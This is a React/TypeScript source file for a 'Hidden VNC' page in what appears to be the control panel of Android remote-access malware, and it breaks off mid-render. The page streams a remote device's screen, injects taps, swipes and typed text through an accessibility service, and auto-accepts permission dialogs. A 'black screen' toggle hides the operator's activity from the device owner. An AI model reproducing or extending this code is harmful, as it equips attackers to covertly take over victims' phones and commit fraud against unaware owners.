import { useRef, useState, useEffect, useCallback } from 'react';
import { useOutletContext } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import { CMD } from '@/types';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import {
  Monitor, Play, Square, Loader2, Settings2, MousePointerClick,
  Camera as CameraIcon, Maximize2, Minimize2, Moon, Type,
  ChevronUp, ChevronDown, RotateCcw, Home, ArrowLeft, LayoutGrid,
  VolumeX, Volume1, Volume2, Bell, Lock, ZoomIn, Scroll,
} from 'lucide-react';
import { onHvncUpdate, getAdminSocket } from '@/services/socket';
import {
  DevicePageHeader, ErrorAlert, LoadingSkeleton, StatusBadge, SectionCard, EmptyState,
} from '@/components/device/shared';
import type { DeviceOutletContext } from '@/types';
import type { Socket } from 'socket.io-client';

// ── Constants ────────────────────────────────────────────────────────────────

const DECODE_QUEUE_LIMIT = 5;
const STALE_CHUNK_MS = 5000;
const CHUNK_SWEEP_INTERVAL_MS = 2000;
const MAX_CONCURRENT_TRANSFERS = 16;
const START_TIMEOUT_MS = 30000;
const DECODER_RECREATE_COOLDOWN_MS = 1000;
const DOUBLE_TAP_WINDOW_MS = 280;
const DRAG_THRESHOLD_PX = 10;
const LONGPRESS_THRESHOLD_MS = 500;

type HvncMeta = { id: string; type: string; [key: string]: unknown };

interface ChunkBuf {
  received: Map<number, Uint8Array>;
  total: number;
  totalSize: number;
  pts: number;
  keyframe: boolean;
  createdAt: number;
}

interface PointerState {
  x: number;
  y: number;
  startX: number;
  startY: number;
}

// ── Component ────────────────────────────────────────────────────────────────

export default function HvncPage() {
  const { clientId: id, online } = useOutletContext<DeviceOutletContext>();

  const canvasRef    = useRef<HTMLCanvasElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);

  // ── original state ──────────────────────────────────────────────────────────
  const [streaming,  setStreaming]  = useState(false);
  const [status,     setStatus]     = useState<string>('idle');
  const [error,      setError]      = useState<string | null>(null);
  const [loading,    setLoading]    = useState(true);
  const [fps,        setFps]        = useState(20);
  const [quality,    setQuality]    = useState(60);
  const [scale,      setScale]      = useState(50);
  const [iframeInterval, setIframeInterval] = useState(0);
  const [showSettings,   setShowSettings]   = useState(false);
  const [accessibilityEnabled,   setAccessibilityEnabled]   = useState<boolean | null>(null);
  const [accessibilityConnected, setAccessibilityConnected] = useState<boolean | null>(null);
  const [codecInfo,        setCodecInfo]        = useState<string>('');
  const [socketConnected,  setSocketConnected]  = useState(!!getAdminSocket()?.connected);

  // ── v4.0 new state ──────────────────────────────────────────────────────────
  const [fullscreen,     setFullscreen]     = useState(false);
  const [blackScreen,    setBlackScreen]    = useState(false);
  const [scrollMode,     setScrollMode]     = useState(false);
  const [showTextInput,  setShowTextInput]  = useState(false);
  const [textInput,      setTextInput]      = useState('');
  const [liveCodec,      setLiveCodec]      = useState<'h264' | 'h265'>('h264');
  const [measuredFps,    setMeasuredFps]    = useState(0);

  // ── refs (existing) ─────────────────────────────────────────────────────────
  const decoderRef         = useRef<VideoDecoder | null>(null);
  const chunkBufferRef     = useRef<Map<string, ChunkBuf>>(new Map());
  const lastDrawnPtsRef    = useRef<number>(-1);
  const frameCountRef      = useRef<number>(0);
  const fpsTimerRef        = useRef<number>(0);
  const lastRecreateRef    = useRef<number>(0);
  const mountedRef         = useRef<boolean>(true);
  const streamingRef       = useRef<boolean>(false);
  const startTimeoutRef    = useRef<number | null>(null);
  const startingRef        = useRef<boolean>(false);

  // ── v4.0 refs ───────────────────────────────────────────────────────────────
  const dragRef         = useRef<{ startX: number; startY: number; startTime: number } | null>(null);
  const lastTapRef      = useRef<{ x: number; y: number; time: number } | null>(null);
  const activePointers  = useRef<Map<number, PointerState>>(new Map());
  const pinchStartRef   = useRef<{ p1: PointerState; p2: PointerState } | null>(null);
  const scrollModeRef   = useRef(false);

  useEffect(() => { scrollModeRef.current = scrollMode; }, [scrollMode]);
  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  // ── fullscreen API ──────────────────────────────────────────────────────────
  const toggleFullscreen = useCallback(async () => {
    const el = containerRef.current;
    if (!el) return;
    try {
      if (!document.fullscreenElement) {
        await el.requestFullscreen();
        setFullscreen(true);
      } else {
        await document.exitFullscreen();
        setFullscreen(false);
      }
    } catch (e) {
      console.warn('Fullscreen error:', e);
    }
  }, []);

  useEffect(() => {
    const onFsChange = () => setFullscreen(!!document.fullscreenElement);
    document.addEventListener('fullscreenchange', onFsChange);
    return () => document.removeEventListener('fullscreenchange', onFsChange);
  }, []);

  // ── v4.0 black screen ──────────────────────────────────────────────────────
  const toggleBlackScreen = useCallback(async () => {
    if (!id) return;
    const next = !blackScreen;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'black_screen', blackScreen: next });
      setBlackScreen(next);
    } catch {}
  }, [id, blackScreen]);

  // ── v4.0 global action helper ──────────────────────────────────────────────
  const sendGlobalAction = useCallback(async (inputType: string) => {
    if (!id || !streaming) return;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType });
    } catch {}
  }, [id, streaming]);

  // ── v4.0 text send ─────────────────────────────────────────────────────────
  const sendText = useCallback(async () => {
    if (!id || !streaming || !textInput) return;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType: 'text', text: textInput });
      setTextInput('');
    } catch {}
  }, [id, streaming, textInput]);

  // ── cleanup ─────────────────────────────────────────────────────────────────
  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      if (streamingRef.current && id) {
        clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }).catch(() => {});
      }
    };
  }, [id]);

  useEffect(() => {
    setStreaming(false);
    setStatus('idle');
    setError(null);
    setCodecInfo('');
    setLiveCodec('h264');
    setMeasuredFps(0);
    setBlackScreen(false);
    setAccessibilityEnabled(null);
    setAccessibilityConnected(null);
    lastDrawnPtsRef.current = -1;
    chunkBufferRef.current.clear();
    if (id) {
      clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }).catch(() => {});
    }
  }, [id]);

  // ── VideoDecoder ────────────────────────────────────────────────────────────
  const createDecoder = useCallback(() => {
    if (!mountedRef.current) return null;
    if (typeof window === 'undefined' || !('VideoDecoder' in window)) {
      setError('Browser does not support WebCodecs. Use Chrome 94+ or Edge 94+.');
      return null;
    }
    try {
      const decoder = new VideoDecoder({
        output: (frame: VideoFrame) => {
          const canvas = canvasRef.current;
          if (!canvas || !mountedRef.current) { frame.close(); return; }
          if (frame.timestamp < lastDrawnPtsRef.current) { frame.close(); return; }
          lastDrawnPtsRef.current = frame.timestamp;
          if (canvas.width  !== frame.displayWidth)  canvas.width  = frame.displayWidth;
          if (canvas.height !== frame.displayHeight) canvas.height = frame.displayHeight;
          const ctx = canvas.getContext('2d');
          if (ctx) ctx.drawImage(frame, 0, 0);
          frame.close();
          frameCountRef.current++;
          const now = performance.now();
          if (fpsTimerRef.current === 0) fpsTimerRef.current = now;
          if (now - fpsTimerRef.current > 1000) {
            const mfps = Math.round(frameCountRef.current * 1000 / (now - fpsTimerRef.current));
            setMeasuredFps(mfps);
            setCodecInfo(prev => {
              const base = prev.replace(/\s*@\d+fps$/, '').trim();
              return base ? `${base} @${mfps}fps` : `@${mfps}fps`;
            });
            frameCountRef.current = 0;
            fpsTimerRef.current = now;
          }
        },
        error: (e: DOMException) => {
          console.error('VideoDecoder error', e);
          if (!mountedRef.current) return;
          setError(`Decoder error: ${e.message}. Recovering…`);
          try { decoderRef.current?.close(); } catch {}
          const now = Date.now();
          if (now - lastRecreateRef.current < DECODER_RECREATE_COOLDOWN_MS) {
            decoderRef.current = null;
            setError(`Decoder error: ${e.message}. Click Stop → Start to recover.`);
            return;
          }
          lastRecreateRef.current = now;
          decoderRef.current = createDecoder();
          if (decoderRef.current && id) {
            clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }).catch(() => {});
          }
        },
      });
      return decoder;
    } catch (e) {
      setError(`Failed to init VideoDecoder: ${e instanceof Error ? e.message : String(e)}`);
      return null;
    }
  }, []);

  useEffect(() => {
    decoderRef.current = createDecoder();
    return () => {
      try {
        if (decoderRef.current?.state === 'configured') decoderRef.current.flush();
        decoderRef.current?.close();
      } catch {}
      decoderRef.current = null;
    };
  }, [createDecoder]);

  // ── socket connection tracker ───────────────────────────────────────────────
  useEffect(() => {
    let attachedSocket: Socket | null = null;
    const onConn = () => setSocketConnected(true);
    const onDisc = () => setSocketConnected(false);
    const poll = setInterval(() => {
      const s = getAdminSocket();
      if (s && s === attachedSocket) return;
      if (s) {
        attachedSocket?.off('connect', onConn);
        attachedSocket?.off('disconnect', onDisc);
        attachedSocket = s;
        s.on('connect', onConn);
        s.on('disconnect', onDisc);
        setSocketConnected(s.connected);
      }
    }, 2000);
    const s0 = getAdminSocket();
    if (s0) { attachedSocket = s0; s0.on('connect', onConn); s0.on('disconnect', onDisc); setSocketConnected(s0.connected); }
    return () => {
      clearInterval(poll);
      attachedSocket?.off('connect', onConn);
      attachedSocket?.off('disconnect', onDisc);
    };
  }, []);

  // ── HVNC message handler (existing decode pipeline + v4.0 extensions) ──────
  useEffect(() => {
    const unsub = onHvncUpdate((meta: HvncMeta, binary?: ArrayBuffer) => {
      if (!meta || meta.id !== id) return;
      const type = meta.type as string;

      if (type === 'status') {
        const st = (meta.status as string) || '';
        if (st === 'streaming') {
          setStreaming(true);
          setStatus('streaming');
          startingRef.current = false;
          if (startTimeoutRef.current) { clearTimeout(startTimeoutRef.current); startTimeoutRef.current = null; }
        } else if (st === 'stopped' || st === 'idle') {
          setStreaming(false);
          setStatus('idle');
          setMeasuredFps(0);
        } else {
          setStatus(st);
        }
        if (meta.accessibilityEnabled !== undefined) setAccessibilityEnabled(meta.accessibilityEnabled as boolean);
        if (meta.accessibilityConnected !== undefined) setAccessibilityConnected(meta.accessibilityConnected as boolean);
        if (meta.codec) {
          const c = meta.codec as string;
          setLiveCodec(c === 'h265' ? 'h265' : 'h264');
          setCodecInfo(prev => {
            const fps = prev.match(/@(\d+)fps/)?.[0] ?? '';
            return `${c.toUpperCase()}${fps ? ' ' + fps : ''}`;
          });
        }
        if (typeof meta.blackScreen === 'boolean') setBlackScreen(meta.blackScreen);
        return;
      }

      if (type === 'black_screen_result') {
        if (typeof meta.blackScreen === 'boolean') setBlackScreen(meta.blackScreen);
        return;
      }

      if (type === 'error') {
        const errMsg = (meta.error as string) || 'Unknown device error';
        if (errMsg.includes('auto_accept_failed')) {
          setError('Screen capture permission needed — approve the dialog on the device.');
        } else if (errMsg.includes('no_permission')) {
          setError('HVNC needs screen capture permission. Starting permission request…');
        } else if (errMsg.includes('accessibility_not_enabled')) {
          setError('Accessibility service required for input. Enable it on the device.');
        } else {
          setError(errMsg);
        }
        if (startingRef.current) { setStatus('idle'); startingRef.current = false; }
        return;
      }

      if (type === 'config' && binary) {
        const codec = (meta.codec as string) === 'h265' ? 'h265' : 'h264';
        setLiveCodec(codec);
        const mimeType = codec === 'h265'
          ? 'video/mp4; codecs="hev1.1.6.L93.B0"'
          : 'video/mp4; codecs="avc1.42E01E"';
        setCodecInfo(prev => {
          const fpsStr = prev.match(/@(\d+)fps/)?.[0] ?? '';
          return `${codec.toUpperCase()}${fpsStr ? ' ' + fpsStr : ''}`;
        });
        const decoder = decoderRef.current;
        if (!decoder || !mountedRef.current) return;
        try {
          const config: VideoDecoderConfig = {
            codec: mimeType.match(/codecs="([^"]+)"/)?.[1] ?? (codec === 'h265' ? 'hev1.1.6.L93.B0' : 'avc1.42E01E'),
            description: new Uint8Array(binary),
          };
          if (decoder.state === 'configured') { try { decoder.flush(); } catch {} }
          decoder.configure(config);
        } catch (e) { console.error('Decoder configure failed', e); }
        return;
      }

      if ((type === 'frame' || type === 'chunk') && binary) {
        processVideoData(type, meta, binary);
      }
    });
    return unsub;
  }, [id, createDecoder]);

  const processVideoData = useCallback((type: string, meta: HvncMeta, binary: ArrayBuffer) => {
    if (type === 'frame') {
      submitFrame(new Uint8Array(binary), (meta.pts as number) ?? 0, (meta.keyframe as boolean) ?? false);
    } else {
      const tid = meta.transferId as string;
      const idx = meta.chunkIndex as number;
      const total = meta.totalChunks as number;
      const totalSize = meta.totalSize as number;
      const pts = (meta.pts as number) ?? 0;
      const keyframe = (meta.keyframe as boolean) ?? false;
      if (!tid || idx == null || total == null) return;
      if (chunkBufferRef.current.size >= MAX_CONCURRENT_TRANSFERS) {
        let oldest = '';
        let oldestTime = Infinity;
        for (const [k, v] of chunkBufferRef.current) {
          if (v.createdAt < oldestTime) { oldestTime = v.createdAt; oldest = k; }
        }
        if (oldest) chunkBufferRef.current.delete(oldest);
      }
      if (!chunkBufferRef.current.has(tid)) {
        chunkBufferRef.current.set(tid, { received: new Map(), total, totalSize, pts, keyframe, createdAt: Date.now() });
      }
      const buf = chunkBufferRef.current.get(tid)!;
      buf.received.set(idx, new Uint8Array(binary));
      if (buf.received.size === total) {
        chunkBufferRef.current.delete(tid);
        const merged = new Uint8Array(totalSize);
        let off = 0;
        for (let i = 0; i < total; i++) {
          const chunk = buf.received.get(i)!;
          merged.set(chunk, off);
          off += chunk.length;
        }
        submitFrame(merged, buf.pts, buf.keyframe);
      }
    }
  }, []);

  const submitFrame = useCallback((data: Uint8Array, ptsUs: number, keyframe: boolean) => {
    const decoder = decoderRef.current;
    if (!decoder || !mountedRef.current) return;
    if (decoder.state !== 'configured') return;
    if (decoder.decodeQueueSize >= DECODE_QUEUE_LIMIT) {
      if (!keyframe) return;
    }
    try {
      decoder.decode(new EncodedVideoChunk({
        type: keyframe ? 'key' : 'delta',
        timestamp: ptsUs,
        data,
      }));
    } catch (e) { console.warn('Decode error', e); }
  }, []);

  // stale chunk GC
  useEffect(() => {
    const timer = setInterval(() => {
      const now = Date.now();
      for (const [tid, b] of chunkBufferRef.current) {
        if (now - b.createdAt > STALE_CHUNK_MS) chunkBufferRef.current.delete(tid);
      }
    }, CHUNK_SWEEP_INTERVAL_MS);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!id) return;
    clientsApi.getOne(id)
      .then(() => setLoading(false))
      .catch((err: any) => {
        setError(err?.response?.status === 404 ? 'Device not found' : 'Failed to load device');
        setLoading(false);
      });
  }, [id]);

  useEffect(() => {
    return () => {
      if (startTimeoutRef.current) { clearTimeout(startTimeoutRef.current); startTimeoutRef.current = null; }
    };
  }, [id]);

  // ── stream control ──────────────────────────────────────────────────────────
  const startStream = useCallback(async () => {
    if (!id) return;
    setError(null);
    setStatus('starting');
    startingRef.current = true;
    lastDrawnPtsRef.current = -1;
    chunkBufferRef.current.clear();
    const d = decoderRef.current;
    if (d?.state === 'configured') { try { d.flush().catch(() => {}); } catch {} }
    if (startTimeoutRef.current) clearTimeout(startTimeoutRef.current);
    startTimeoutRef.current = window.setTimeout(() => {
      if (!streamingRef.current) {
        setStatus('idle');
        setError('Device did not respond within 30s. It may be offline.');
        clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }).catch(() => {});
      }
    }, START_TIMEOUT_MS);
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'start', fps, jpegQuality: quality, scale, iframeInterval });
    } catch (err: any) {
      setError(err?.response?.data?.error || 'Failed to start stream');
      setStatus('idle');
      startingRef.current = false;
      if (startTimeoutRef.current) { clearTimeout(startTimeoutRef.current); startTimeoutRef.current = null; }
    }
  }, [id, fps, quality, scale, iframeInterval]);

  const stopStream = useCallback(async (retain = false) => {
    if (!id) return;
    startingRef.current = false;
    if (startTimeoutRef.current) { clearTimeout(startTimeoutRef.current); startTimeoutRef.current = null; }
    try {
      // v4.0: retain_token = stop encode but keep projection permission (faster restart)
      await clientsApi.sendCommand(id, CMD.HVNC, { action: retain ? 'retain_token' : 'stop' });
    } catch (err: any) { console.warn('Failed to stop stream:', err); }
    const d = decoderRef.current;
    if (d?.state === 'configured') { try { d.flush().catch(() => {}); } catch {} }
    chunkBufferRef.current.clear();
    setStreaming(false);
    setStatus('idle');
    setMeasuredFps(0);
  }, [id]);

  // ── input helpers ───────────────────────────────────────────────────────────
  const sendInput = useCallback(async (inputType: string, x: number, y: number, dx?: number, dy?: number, extra?: Record<string, unknown>) => {
    if (!id || !streaming) return;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, {
        action: 'input',
        inputType,
        x: Math.round(x),
        y: Math.round(y),
        ...(dx !== undefined ? { dx: Math.round(dx) } : {}),
        ...(dy !== undefined ? { dy: Math.round(dy) } : {}),
        ...extra,
      });
    } catch {}
  }, [id, streaming]);

  const checkStatus = useCallback(async () => {
    if (!id) return;
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }); } catch {}
  }, [id]);

  const enableAccessibility = useCallback(async () => {
    if (!id) return;
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'enable_accessibility' }); } catch {}
  }, [id]);

  const snapshot = useCallback(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    try {
      canvas.toBlob((blob) => {
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `hvnc-${id}-${Date.now()}.png`;
        a.click();
        setTimeout(() => URL.revokeObjectURL(url), 1000);
      }, 'image/png');
    } catch {}
  }, [id]);

  // ── pointer / gesture handling ──────────────────────────────────────────────
  const getCanvasCoords = useCallback((clientX: number, clientY: number) => {
    const canvas = canvasRef.current;
    if (!canvas) return null;
    const rect = canvas.getBoundingClientRect();
    const sx = canvas.width / rect.width;
    const sy = canvas.height / rect.height;
    return { x: (clientX - rect.left) * sx, y: (clientY - rect.top) * sy };
  }, []);

  // v4.0: pointer events for single + multi-touch
  const handlePointerDown = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const coords = getCanvasCoords(e.clientX, e.clientY);
    if (!coords) return;
    activePointers.current.set(e.pointerId, { x: coords.x, y: coords.y, startX: coords.x, startY: coords.y });
    if (activePointers.current.size === 2) {
      const pts = Array.from(activePointers.current.values());
      pinchStartRef.current = { p1: { ...pts[0] }, p2: { ...pts[1] } };
    } else if (activePointers.current.size === 1) {
      dragRef.current = { startX: coords.x, startY: coords.y, startTime: Date.now() };
    }
  }, [getCanvasCoords]);

  const handlePointerMove = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const coords = getCanvasCoords(e.clientX, e.clientY);
    if (!coords) return;
    const existing = activePointers.current.get(e.pointerId);
    if (existing) {
      activePointers.current.set(e.pointerId, { ...existing, x: coords.x, y: coords.y });
    }
  }, [getCanvasCoords]);

  const handlePointerUp = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const coords = getCanvasCoords(e.clientX, e.clientY);
    if (!coords) return;
    const ptr = activePointers.current.get(e.pointerId);
    activePointers.current.delete(e.pointerId);

    // pinch complete
    if (pinchStartRef.current && ptr) {
      const start = pinchStartRef.current;
      pinchStartRef.current = null;
      // figure out which start point this pointer corresponds to by proximity
      const d1 = Math.hypot(ptr.startX - start.p1.startX, ptr.startY - start.p1.startY);
      const d2 = Math.hypot(ptr.startX - start.p2.startX, ptr.startY - start.p2.startY);
      const movedP1 = d1 < d2;
      const endP1 = movedP1 ? coords : { x: ptr.startX, y: ptr.startY };
      const endP2 = movedP1 ? { x: ptr.startX, y: ptr.startY } : coords;
      sendInput('pinch',
        start.p1.startX, start.p1.startY,
        endP1.x - start.p1.startX, endP1.y - start.p1.startY,
        {
          x2: Math.round(start.p2.startX),
          y2: Math.round(start.p2.startY),
          dx2: Math.round(endP2.x - start.p2.startX),
          dy2: Math.round(endP2.y - start.p2.startY),
          duration: 400,
        }
      );
      dragRef.current = null;
      return;
    }

    if (!dragRef.current) return;
    const dx = coords.x - dragRef.current.startX;
    const dy = coords.y - dragRef.current.startY;
    const elapsed = Date.now() - dragRef.current.startTime;
    const moved = Math.abs(dx) > DRAG_THRESHOLD_PX || Math.abs(dy) > DRAG_THRESHOLD_PX;

    if (!moved) {
      if (elapsed >= LONGPRESS_THRESHOLD_MS) {
        sendInput('longpress', dragRef.current.startX, dragRef.current.startY, undefined, undefined, { duration: elapsed });
      } else {
        // v4.0: double-tap detection
        const now = Date.now();
        const last = lastTapRef.current;
        if (last &&
          now - last.time < DOUBLE_TAP_WINDOW_MS &&
          Math.abs(dragRef.current.startX - last.x) < 40 &&
          Math.abs(dragRef.current.startY - last.y) < 40) {
          sendInput('doubletap', dragRef.current.startX, dragRef.current.startY);
          lastTapRef.current = null;
        } else {
          sendInput('tap', dragRef.current.startX, dragRef.current.startY);
          lastTapRef.current = { x: dragRef.current.startX, y: dragRef.current.startY, time: now };
        }
      }
    } else {
      // v4.0: scroll mode sends 'scroll' instead of 'swipe'
      const gesture = scrollModeRef.current ? 'scroll' : 'swipe';
      sendInput(gesture, dragRef.current.startX, dragRef.current.startY, dx, dy, { duration: scrollModeRef.current ? 150 : 300 });
    }
    dragRef.current = null;
  }, [getCanvasCoords, sendInput]);

  const handlePointerCancel = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    activePointers.current.delete(e.pointerId);
    dragRef.current = null;
    pinchStartRef.current = null;
  }, []);

  // ── keyboard shortcut: volume keys on canvas focus ──────────────────────────
  const handleKeyDown = useCallback((e: React.KeyboardEvent<HTMLCanvasElement>) => {
    if (!streaming) return;
    if (e.key === 'ArrowUp')   { e.preventDefault(); sendGlobalAction('volume_up'); }
    if (e.key === 'ArrowDown') { e.preventDefault(); sendGlobalAction('volume_down'); }
    if (e.key === 'Escape' && fullscreen) toggleFullscreen();
  }, [streaming, sendGlobalAction, fullscreen, toggleFullscreen]);

  if (loading) return <LoadingSkeleton rows={4} />;

  const canAct = online && socketConnected;

  // ── gesture toolbar buttons ─────────────────────────────────────────────────
  const GestureToolbar = () => (
    <div className="flex flex-wrap items-center gap-1 px-3 py-2 bg-zinc-900/90 border-t border-zinc-700">
      <span className="text-[10px] text-zinc-500 mr-1">INPUT</span>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Back"       onClick={() => sendGlobalAction('back')}>      <ArrowLeft className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Home"       onClick={() => sendGlobalAction('home')}>      <Home className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Recents"    onClick={() => sendGlobalAction('recents')}>   <LayoutGrid className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Status Bar" onClick={() => sendGlobalAction('statusbar')}><Bell className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Vol +"      onClick={() => sendGlobalAction('volume_up')}>  <Volume2 className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Vol -"      onClick={() => sendGlobalAction('volume_down')}><Volume1 className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Mute"       onClick={() => sendGlobalAction('volume_mute')}><VolumeX className="h-3.5 w-3.5" /></Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Lock"       onClick={() => sendGlobalAction('lock_screen')}><Lock className="h-3.5 w-3.5" /></Button>
      <div className="w-px h-5 bg-zinc-700 mx-0.5" />
      <Button
        size="sm" variant={scrollMode ? 'secondary' : 'ghost'}
        className={`h-7 px-2 text-xs ${scrollMode ? 'text-blue-400' : 'text-zinc-300 hover:text-white'}`}
        title={scrollMode ? 'Scroll mode ON (drag = scroll)' : 'Scroll mode OFF (drag = swipe)'}
        onClick={() => setScrollMode(v => !v)}
      >
        <Scroll className="h-3.5 w-3.5 mr-1" />{scrollMode ? 'Scroll' : 'Swipe'}
      </Button>
      <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Type text" onClick={() => setShowTextInput(v => !v)}>
        <Type className="h-3.5 w-3.5" />
      </Button>
      <div className="ml-auto flex items-center gap-1">
        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title="Snapshot" onClick={snapshot}><CameraIcon className="h-3.5 w-3.5" /></Button>
        <Button
          size="sm" variant={blackScreen ? 'secondary' : 'ghost'}
          className={`h-7 px-2 text-xs ${blackScreen ? 'text-yellow-400' : 'text-zinc-300 hover:text-white'}`}
          title={blackScreen ? 'Black screen ON' : 'Black screen OFF'}
          onClick={toggleBlackScreen}
        >
          <Moon className="h-3.5 w-3.5" />
        </Button>
        <Button size="sm" variant="ghost" className="h-7 px-2 text-xs text-zinc-300 hover:text-white" title={fullscreen ? 'Exit fullscreen' : 'Fullscreen'} onClick={toggleFullscreen}>
          {fullscreen ? <Minimize2 className="h-3.5 w-3.5" /> : <Maximize2 className="h-3.5 w-3.5" />}
        </Button>
      </div>
    </div>
  );

  return (
    <div className="space-y-4">
      <DevicePageHeader
        title="HVNC: Hidden VNC"
        subtitle={`Remote screen view + touch control${liveCodec ? ` · ${liveCodec.toUpperCase()}` : ''}${measuredFps ? ` · ${measuredFps}fps` : ''}`}
        badge={{ label: streaming ? 'Streaming' : 'Stopped', variant: streaming ? 'default' : 'secondary' }}
        actions={[
          ...(!streaming
            ? [{ label: 'Start', icon: Play, onClick: startStream, disabled: !canAct || status === 'starting', variant: 'default' as const }]
            : [
                { label: 'Stop', icon: Square, onClick: () => stopStream(false), disabled: !canAct, variant: 'destructive' as const },
                { label: 'Pause', icon: RotateCcw, onClick: () => stopStream(true), disabled: !canAct, variant: 'outline' as const, title: 'Stop stream but keep projection token for fast restart' },
              ]
          ),
          { label: 'Settings', icon: Settings2, onClick: () => setShowSettings(!showSettings), variant: showSettings ? 'default' : 'outline' as const },
          { label: 'Status', onClick: checkStatus, variant: 'outline' as const },
        ]}
        refresh={checkStatus}
        loading={status === 'starting'}
      />

      <div className="flex items-center gap-2 flex-wrap">
        <StatusBadge label={streaming ? 'Streaming' : 'Stopped'} status={streaming ? 'success' : 'neutral'} />
        {accessibilityEnabled === false && <StatusBadge label="Input Off" status="danger" />}
        {accessibilityEnabled === true && accessibilityConnected === false && <StatusBadge label="Input Not Ready" status="warning" />}
        {accessibilityEnabled === true && accessibilityConnected === true && <StatusBadge label="Input On" status="success" />}
        {!online && <StatusBadge label="Device Offline" status="danger" />}
        {streaming && liveCodec && (
          <Badge variant="outline" className="text-[10px] font-mono">
            {liveCodec.toUpperCase()} · {measuredFps}fps
          </Badge>
        )}
        {blackScreen && <Badge variant="secondary" className="text-[10px]">Black Screen</Badge>}
        {scrollMode && <Badge variant="secondary" className="text-[10px] text-blue-400">Scroll Mode</Badge>}
      </div>

      {status === 'starting' && !streaming && !error && (
        <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-700 dark:text-amber-400 text-sm flex items-start gap-2">
          <Loader2 className="h-4 w-4 shrink-0 mt-0.5 animate-spin" />
          <div>
            <p className="font-medium">Starting screen capture…</p>
            <p className="text-xs mt-1 opacity-80">
              Device will show a system permission dialog. Auto-accept will handle it if accessibility is enabled (timeout 30s).
            </p>
          </div>
        </div>
      )}

      {error && <ErrorAlert message={error} onRetry={checkStatus} />}

      {accessibilityEnabled === false && (
        <div className="flex items-center gap-2">
          <Button variant="outline" onClick={enableAccessibility} disabled={!canAct} className="gap-2 text-amber-600">
            <Settings2 className="h-4 w-4" /> Enable Input
          </Button>
        </div>
      )}

      {showSettings && (
        <SectionCard title="Stream Settings" icon={Settings2}>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="space-y-1">
              <Label className="text-xs">FPS (1–60)</Label>
              <Input type="number" value={fps} min={1} max={60} onChange={e => setFps(Math.max(1, Math.min(60, parseInt(e.target.value) || 20)))} disabled={streaming} />
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Quality (10–100)</Label>
              <Input type="number" value={quality} min={10} max={100} onChange={e => setQuality(Math.max(10, Math.min(100, parseInt(e.target.value) || 60)))} disabled={streaming} />
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Scale % (10–100)</Label>
              <Input type="number" value={scale} min={10} max={100} onChange={e => setScale(Math.max(10, Math.min(100, parseInt(e.target.value) || 50)))} disabled={streaming} />
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Keyframe interval (0 = every frame)</Label>
              <Input type="number" value={iframeInterval} min={0} max={10} onChange={e => setIframeInterval(Math.max(0, Math.min(10, parseInt(e.target.value) || 0)))} disabled={streaming} />
            </div>
          </div>
          {streaming && <p className="text-xs text-muted-foreground mt-3">Stop the stream to change settings.</p>}
        </SectionCard>
      )}

      {/* ── Main HVNC panel ────────────────────────────────────────────────── */}
      <div
        ref={containerRef}
        className={`rounded-xl overflow-hidden border border-zinc-800 shadow-xl ${fullscreen ? 'fixed inset-0 z-50 rounded-none border-none' : ''}`}
      >
        {/* Canvas area */}
        <div className="relative bg-black flex items-center justify-center" style={{ minHeight: fullscreen ? '100vh' : 320 }}>
          {streaming ? (
            <canvas
              ref={canvasRef}
              onPointerDown={handlePointerDown}
              onPointerMove={handlePointerMove}
              onPointerUp={handlePointerUp}
              onPointerCancel={handlePointerCancel}
              onKeyDown={handleKeyDown}
              tabIndex={0}
              aria-label="Remote device screen"
              className={`touch-none cursor-pointer focus:outline-none ${fullscreen ? 'w-full h-full object-contain' : 'max-w-full max-h-[65vh]'}`}
              style={{ imageRendering: 'auto', display: 'block' }}
            />
          ) : (
